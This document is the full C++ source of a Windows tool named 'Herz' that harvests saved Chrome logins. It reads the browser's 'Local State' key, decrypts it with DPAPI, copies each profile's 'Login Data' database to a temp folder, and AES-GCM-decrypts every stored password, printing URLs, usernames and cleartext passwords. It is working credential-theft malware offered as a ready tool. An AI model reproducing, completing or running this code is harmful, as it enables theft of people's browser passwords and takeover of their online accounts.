#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <wincrypt.h>
#include <winternl.h>
#include <bcrypt.h>

#include "sqlite3.h"

#include <iostream>
#include <vector>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <regex>
#include <stdexcept>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")


typedef struct _userinfo {
	std::string url;
	std::string username;
	std::string password;

} USERINFO, * PUSERINFO;


std::wstring stringToWstring(const std::string& str) {
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstrTo[0], size_needed);
	return wstrTo;
}


std::vector<std::string> ListDir(const std::string& path) {
	std::vector<std::string> names;
	std::string searchPath = path + "\\*";
	WIN32_FIND_DATAA fd;

	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				continue;
			}

			std::string name = fd.cFileName;
			if (name != "." && name != "..") {
				names.push_back(name);
			}
		} while (FindNextFileA(hFind, &fd));

		FindClose(hFind);
	}

	return names;
}


std::string GetLocalStateFileContent(const std::string& fileName) {
	HANDLE hFile = CreateFileA(fileName.c_str(), GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE) {
		return "";
	}

	DWORD dwFileSize = GetFileSize(hFile, nullptr);
	if (dwFileSize == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return "";
	}

	std::string buffer(dwFileSize, '\0');
	DWORD dwBytesRead;
	BOOL readSuccess = ReadFile(hFile, &buffer[0], dwFileSize, &dwBytesRead, nullptr);

	if (!readSuccess || dwBytesRead != dwFileSize) {
		CloseHandle(hFile);
		return "";
	}

	CloseHandle(hFile);
	return buffer;
}


std::string ExtractEncryptedKey(const std::string& jsonData) {
	std::regex pattern("\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
	std::smatch matches;

	if (std::regex_search(jsonData, matches, pattern) && matches.size() > 1) {
		return matches[1].str();
	}

	else {
		return "";
	}
}


std::vector<BYTE> B64Decode(const std::string& base64String) {
	DWORD dwDecodedLen = 0;
	if (!CryptStringToBinaryA(base64String.c_str(), base64String.length(), CRYPT_STRING_BASE64, nullptr, &dwDecodedLen, nullptr, nullptr)) {
		return {};
	}

	std::vector<BYTE> decodedData(dwDecodedLen);
	if (!CryptStringToBinaryA(base64String.c_str(), base64String.length(), CRYPT_STRING_BASE64, decodedData.data(), &dwDecodedLen, nullptr, nullptr)) {
		return {};
	}

	return decodedData;
}


std::vector<BYTE> UnprotectData(const std::vector<BYTE>& data) {
	DATA_BLOB dataIn;
	dataIn.pbData = const_cast<BYTE*>(data.data());
	dataIn.cbData = data.size();

	DATA_BLOB dataOut;
	if (!CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut)) {
		return {};
	}

	std::vector<BYTE> unprotectedData(dataOut.pbData, dataOut.pbData + dataOut.cbData);
	LocalFree(dataOut.pbData);

	return unprotectedData;
}


bool OpenDB(const std::string& dbPath, std::vector<USERINFO>& dbData) {
	sqlite3* db;
	sqlite3_stmt* stmt;

	int dc = sqlite3_open(dbPath.c_str(), &db);
	if (dc != SQLITE_OK) {
		sqlite3_close(db);
		return false;
	}

	LPCSTR query = "SELECT origin_url, username_value, password_value FROM logins";
	dc = sqlite3_prepare_v2(db, query, -1, &stmt, nullptr);

	if (dc != SQLITE_OK) {
		sqlite3_finalize(stmt);
		sqlite3_close(db);
		return false;
	}

	while ((dc = sqlite3_step(stmt)) == SQLITE_ROW) {
		const unsigned char* url = sqlite3_column_text(stmt, 0);
		const unsigned char* user = sqlite3_column_text(stmt, 1);
		const unsigned char* pass = sqlite3_column_text(stmt, 2);

		USERINFO ui;
		ui.url = reinterpret_cast<const char*>(url);
		ui.username = reinterpret_cast<const char*>(user);
		ui.password = reinterpret_cast<const char*>(pass);

		dbData.push_back(ui);
	}

	if (dc != SQLITE_DONE) {
		sqlite3_finalize(stmt);
		sqlite3_close(db);
		return false;
	}

	sqlite3_finalize(stmt);
	sqlite3_close(db);

	return true;
}


std::vector<BYTE> AESDecrypt(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& key) {
	BCRYPT_ALG_HANDLE hAlg = nullptr;
	BCRYPT_KEY_HANDLE hKey = nullptr;
	NTSTATUS status;

	std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
	std::vector<BYTE> encryptedPassword(ciphertext.begin() + 15, ciphertext.end() - 16);
	std::vector<BYTE> authTag(ciphertext.end() - 16, ciphertext.end());

	if (!BCRYPT_SUCCESS(status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
		throw std::runtime_error("BCryptOpenAlgorithmProvider failed");
	}

	if (!BCRYPT_SUCCESS(status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
		BCryptCloseAlgorithmProvider(hAlg, 0);
		throw std::runtime_error("BCryptSetProperty failed");
	}

	if (!BCRYPT_SUCCESS(status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
		BCryptCloseAlgorithmProvider(hAlg, 0);
		throw std::runtime_error("BCryptGenerateSymmetricKey failed");
	}

	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
	authInfo.pbNonce = iv.data();
	authInfo.cbNonce = (ULONG)iv.size();
	authInfo.pbTag = authTag.data();
	authInfo.cbTag = (ULONG)authTag.size();

	std::vector<BYTE> decryptedPassword(encryptedPassword.size());
	ULONG decryptedSize = 0;
	if (!BCRYPT_SUCCESS(status = BCryptDecrypt(hKey, encryptedPassword.data(), (ULONG)encryptedPassword.size(), &authInfo, nullptr, 0, decryptedPassword.data(), (ULONG)decryptedPassword.size(), &decryptedSize, 0))) {
		BCryptDestroyKey(hKey);
		BCryptCloseAlgorithmProvider(hAlg, 0);
		throw std::runtime_error("BCryptDecrypt failed");
	}

	BCryptDestroyKey(hKey);
	BCryptCloseAlgorithmProvider(hAlg, 0);

	decryptedPassword.resize(decryptedSize);
	return decryptedPassword;
}


int main() {

	std::cout << "ooooo ooooo                                    \n";
	std::cout << " 888   888   ooooooooo8 oo oooooo   ooooooooooo\n";
	std::cout << " 888ooo888  888oooooo8   888    888      8888  \n";
	std::cout << " 888   888  888          888          8888     \n";
	std::cout << "o888o o888o   88oooo888 o888o       o888ooooooo\n";

	std::cout << "\n[+] Variables are setting up..." << std::endl;

	std::string chromePath = getenv("USERPROFILE") + std::string("\\AppData\\Local\\Google\\Chrome\\User Data");
	std::string chromeLocalStatePath = getenv("USERPROFILE") + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
	LPCWSTR dest = L"C:\\Windows\\Temp\\herz.db";

	Sleep(1000);

	std::cout << "[+] Herz getting content of Local State..." << std::endl;

	std::string localStateContent = GetLocalStateFileContent(chromeLocalStatePath);

	std::cout << "[+] Herz decrypting keys..." << std::endl;

	Sleep(500);

	std::string key = ExtractEncryptedKey(localStateContent);
	std::vector<BYTE> decodedKey = B64Decode(key);

	if (decodedKey.size() > 5) {
		decodedKey.erase(decodedKey.begin(), decodedKey.begin() + 5);
	}

	std::vector<BYTE> unDecodedKey = UnprotectData(decodedKey);

	std::vector<std::string> dirs = ListDir(chromePath);
	std::vector<std::string> folders;
	std::regex pattern("^Profile.*|^Default$");

	for (const auto& element : dirs) {
		if (std::regex_search(element, pattern)) {
			folders.push_back(element);
		}
	}

	std::string userProfile = getenv("USERPROFILE");

	for (size_t i = 0; i < folders.size(); ++i) {
		std::string dbPath = userProfile + "\\AppData\\Local\\Google\\Chrome\\User Data\\" + folders[i] + "\\" + "Login Data";
		std::wstring wdbPath = stringToWstring(dbPath);

		if (!CopyFileW(wdbPath.c_str(), dest, false)) {
			std::cerr << "[-] File couldn't copied" << std::endl;
			std::cout << "[*] Exitting..." << std::endl;

			return -1;
		}

		std::vector<USERINFO> ui;
		
		bool rv = OpenDB(dbPath, ui);

		if (rv == false) {
			std::cerr << "[-] Db file cannot open..." << std::endl;

			return -1;
		}

		// std::string sKey(unDecodedKey.begin(), unDecodedKey.end());

		for (const auto& u : ui) {
			try {
				std::vector<BYTE> encryptedPass(u.password.begin(), u.password.end());
				std::vector<BYTE> decryptedPass = AESDecrypt(encryptedPass, unDecodedKey);
				std::string clearTextPassword(decryptedPass.begin(), decryptedPass.end());

				std::cout << "\n-----------------------------------------------------" << std::endl;
				std::cout << "URL: " << u.url << std::endl;
				std::cout << "Username or Email: " << u.username << std::endl;
				std::cout << "Password: " << clearTextPassword << std::endl;
				std::cout << "-----------------------------------------------------" << std::endl;
			}

			catch (const std::exception& e) {
				std::cerr << e.what() << std::endl;
			}
		}
		
	}

	if (!DeleteFileW(dest)) {
		std::cerr << "[!] Db file couldn't deleted, you can remove it via PowerShell or Cmd" << std::endl;
		std::wcout << L"Db file: " << dest << std::endl;
	}

	std::cout << "\n[+] Herz has been finished" << std::endl;

	return 0;
}
